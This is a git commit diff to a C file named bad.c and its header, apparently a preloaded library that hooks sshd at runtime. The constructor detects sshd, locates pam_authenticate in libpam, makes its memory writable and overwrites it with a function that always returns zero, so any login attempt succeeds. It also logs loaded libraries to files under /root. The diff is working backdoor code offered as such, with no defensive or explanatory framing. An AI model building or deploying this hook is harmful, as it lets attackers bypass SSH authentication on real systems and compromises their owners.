8951ed40d3dd4cffba1cf69598b732e3b9b1d2be
Ryan Bossman <rlbossman@gmail.com>
2015-03-26 19:17:39 -0500

    aaa

--- bad.c
+++ bad.c
@@ -14,38 +14,18 @@
 
 #include "bad.h"
 
-void handlesigsegv(int sig)
+static void handlesigsegv(int sig)
 {
-	//TODO
+	//TODO SIGBUS and actually handle an error
 	//unregister us
 	signal(sig, SIG_DFL);
 	kill(getpid(), sig);
 }
 
-int retzero(pam_handle_t *x, int i)
+static int retzero(pam_handle_t *x, int i)
 {
 	return 0;
 }
-
-static int
-callback(struct dl_phdr_info *info, size_t size, void *data)
-{
-	int j;
-	FILE *fp = fopen("/root/asd", "a+");
-
-	fprintf(fp, "name=%s (%d segments)\n", info->dlpi_name,
-			info->dlpi_phnum);
-
-	for (j = 0; j < info->dlpi_phnum; j++) {
-		fprintf(fp, "\t\theader %2d: addr=%10p - offset=%d - vaddr=%p - paddr=%p - filesz=%llu - memsz=%llu - align=%llu\n",
-					 j,  (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr),info->dlpi_phdr[j].p_offset, info->dlpi_phdr[j].p_vaddr, info->dlpi_phdr[j].p_paddr, 
-					info->dlpi_phdr[j].p_filesz, info->dlpi_phdr[j].p_memsz, info->dlpi_phdr[j].p_align);
-	}
-	fflush(fp);
-	fclose(fp);
-	return 0;
-}
-
 
 /* 
  * libs should always be(?)loaded page aligned. 
@@ -59,7 +39,7 @@ callback(struct dl_phdr_info *info, size_t size, void *data)
  * long long int nextpage = (((long long int) dli->dli_saddr / PAGE_SIZE) + 1) * PAGE_SIZE;
  *
  */
-int hook(void *lib, void *func, void *replace, size_t replacelen)
+static int hook(void *lib, void *func, void *replace, size_t replacelen)
 {
 	int PAGE_SIZE = getpagesize();
 	
@@ -69,45 +49,24 @@ int hook(void *lib, void *func, void *replace, size_t replacelen)
 	size_t len = PAGE_SIZE * PAGES;
 	mprotect((void *) lib, len, PROT_READ | PROT_WRITE | PROT_EXEC);
 	
-	memcpy(func, replace, replacelen); /* known good--4 byte alignment(? - retzero() is 17 bytes according to objdump?) */
+	memcpy(func, replace, replacelen);
 	
 	mprotect((void *) lib, len, PROT_READ | PROT_EXEC);
 
 	return 0;
 }
 
-
- __attribute__((constructor)) void bad(void) 
+/*
+ * lib = start of lib we search - use get_libstart()
+ */
+static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname, int (*dladdrptr)(void *, Dl_info *))      
 {
-	if (getuid() != 0) //TODO FIX: this will break userspace crap otherwise
-		return;
-
-	/* get handles to dlinfo() and dladdr() because lazy */	
-	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
-	dlinfoptr = dlsym(dlhandle, "dlinfo");
-	dladdrptr = dlsym(dlhandle, "dladdr");
-	dl_iterate_phdrptr = dlsym(dlhandle, "dl_iterate_phdr");
-	dlclose(dlhandle);
-
-	FILE *fp;
-	fp = fopen("/root/asf", "w+");
-	
-	struct link_map *map;
-	void *ourhandle = dlopen(NULL, 	RTLD_NOW);
-	dlinfoptr(ourhandle, 2, &map);
-
+	struct link_map *map = link_map;
 	Dl_info *dli = malloc(sizeof(Dl_info));
-	
-	signal(SIGSEGV, handlesigsegv);
 
-	/* we have a map of all loaded libraries, 
-	 * now iterate through them until we get to an interesting one (libpam)
-	 * take libpam's load address and check for interesting function pointers using dladdr()
-	 */
 	while (map != NULL) { 
-		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
-		if (strstr(map->l_name, "libpam.so.0") != NULL) {
-			void *libstart = (void *)map->l_addr; // libpam loaded here -- confirm /proc/$PID/maps 
+		if ((void *) map->l_addr == lib) {
+			void *libstart = (void *)map->l_addr;
 			
 			void *libend = (void *)map->l_next->l_addr; 
 		
@@ -116,16 +75,9 @@ int hook(void *lib, void *func, void *replace, size_t replacelen)
 				dladdrptr(libstart, dli);
 					
 				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
-					if (strcmp(dli->dli_sname, "pam_authenticate") == 0) {
-						/*
-						fprintf(fp, "got pam_authenticate @ %p\n", dli->dli_saddr);
-						dl_iterate_phdrptr(callback, NULL);
-						fflush(fp);
-						*/
-						
-						int ret = hook((void *)map->l_addr, dli->dli_saddr, retzero, 20);
-						
-						done = true;
+					if (strcmp(dli->dli_sname, funcname) == 0) {
+						free(dli);
+						return dli->dli_saddr;	
 					}
 				}
 				libstart += 16; // XXX: testme += 64
@@ -133,7 +85,121 @@ int hook(void *lib, void *func, void *replace, size_t replacelen)
 		}
 		map = map->l_next;
 	} 
+
+	free(dli);
+	return NULL;
+}
+
+static void *get_libstart(struct link_map *link_map, char *lib)
+{
+	struct link_map *map = link_map;
+
+	while (map != NULL) { 
+		if (strstr(map->l_name, lib) != NULL) 
+			return (void*)map->l_addr;
+
+		map = map->l_next;
+	}
+
+	return NULL;
+}
+
+static void print_libs(struct link_map *link_map)
+{
+	FILE *fp;
+	fp = fopen("/root/asf", "w");
+
+	struct link_map *map = link_map;
+	Dl_info *dli = malloc(sizeof(Dl_info));
+
+	while (map != NULL) { 
+		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
+		map = map->l_next;
+	} 
+
+	free(dli);
+	fflush(fp);
 	fclose(fp);
+
+	return;
+}
+
+static int is_sshd(struct link_map *link_map)
+{
+	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
+	if (dlhandle == NULL)
+		return -1;
+	dlinfoptr = dlsym(dlhandle, "dlinfo");
+	dladdrptr = dlsym(dlhandle, "dladdr");
+	dlclose(dlhandle);
+	
+	if (!dlinfoptr || !dladdrptr)
+		return -1;
+
+	void *ourhandle = dlopen(NULL, 	RTLD_NOW);
+	dlinfoptr(ourhandle, 2, &link_map);
+	dlclose(ourhandle);
+
+	void *wrapstart = get_libstart(link_map, "libwrap.so.0");
+	void *pamstart = get_libstart(link_map, "libpam.so.0");
+
+	if (!wrapstart || !pamstart)
+		return -1;
+		
+	void *hosts_access = find_func_ptr(link_map, wrapstart, "hosts_access", dladdrptr);
+	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate", dladdrptr);
+
+	if (!hosts_access || !pam_authenticate)
+		return -1;
+
+	return 0;
+}
+
+
+ __attribute__ ((constructor)) static void bad(void) 
+{
+	struct link_map *link_map;
+	if (is_sshd(link_map) != 0)
+		return;
+
+	void *ourhandle = dlopen(NULL, 	RTLD_NOW);
+	dlinfoptr(ourhandle, 2, &link_map);
+
+	signal(SIGSEGV, handlesigsegv);
+
+	print_libs(link_map);
+
+	void *libpam = get_libstart(link_map, "libpam.so.0");
+	void *pam_auth = find_func_ptr(link_map, libpam, "pam_authenticate", dladdrptr);
+
+	hook(libpam, pam_auth, retzero, 20);
 	
 	return;
 }
+
+
+/*	
+	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
+	dl_iterate_phdrptr = dlsym(dlhandle, "dl_iterate_phdr");
+	dlclose(dlhandle);
+
+static int callback(struct dl_phdr_info *info, size_t size, void *data)
+{
+	int j;
+	FILE *fp = fopen("/root/asd", "a+");
+
+	fprintf(fp, "name=%s (%d segments)\n", info->dlpi_name,
+			info->dlpi_phnum);
+
+	for (j = 0; j < info->dlpi_phnum; j++) {
+		fprintf(fp, "\t\theader %2d: addr=%10p - offset=%d - vaddr=%p - paddr=%p - filesz=%llu - memsz=%llu - align=%llu\n",
+					 j,  (void*)(info->dlpi_addr + info->dlpi_phdr[j].p_vaddr), (int)info->dlpi_phdr[j].p_offset, (void*)info->dlpi_phdr[j].p_vaddr,
+						 (void*)info->dlpi_phdr[j].p_paddr,	(unsigned long long int)info->dlpi_phdr[j].p_filesz, 
+						 (unsigned long long int)info->dlpi_phdr[j].p_memsz, (unsigned long long int)info->dlpi_phdr[j].p_align);
+	}
+	fflush(fp);
+	fclose(fp);
+	return 0;
+}
+
+*/
--- bad.h
+++ bad.h
@@ -9,23 +9,11 @@ struct dl_phdr_info
     const ElfW(Phdr) *dlpi_phdr;
     ElfW(Half) dlpi_phnum;
 
-    /* Note: Following members were introduced after the first
-       version of this structure was available.  Check the SIZE
-       argument passed to the dl_iterate_phdr callback to determine
-       whether or not each later member is available.  */
-
-    /* Incremented when a new object may have been added.  */
     unsigned long long int dlpi_adds;
-    /* Incremented when an object may have been removed.  */
     unsigned long long int dlpi_subs;
 
-    /* If there is a PT_TLS segment, its module ID as used in
-       TLS relocations, else zero.  */
     size_t dlpi_tls_modid;
 
-    /* The address of the calling thread's instance of this module's
-       PT_TLS segment, if it has one and it has been allocated
-       in the calling thread, otherwise a null pointer.  */
     void *dlpi_tls_data;
 };
 
@@ -37,9 +25,8 @@ typedef struct {
 } Dl_info;
 
 
-int (*dlinfoptr) (void *, int, void *); 
-int (*dladdrptr) (void *, Dl_info *);
-int (*dl_iterate_phdrptr) ( int (*callback) (struct dl_phdr_info *info, size_t size, void *data),
-						void *data);
+static int (*dlinfoptr) (void *, int, void *); 
+static int (*dladdrptr) (void *, Dl_info *);
+//static int (*dl_iterate_phdrptr) ( int (*callback) (struct dl_phdr_info *info, size_t size, void *data) void *data);
 
 
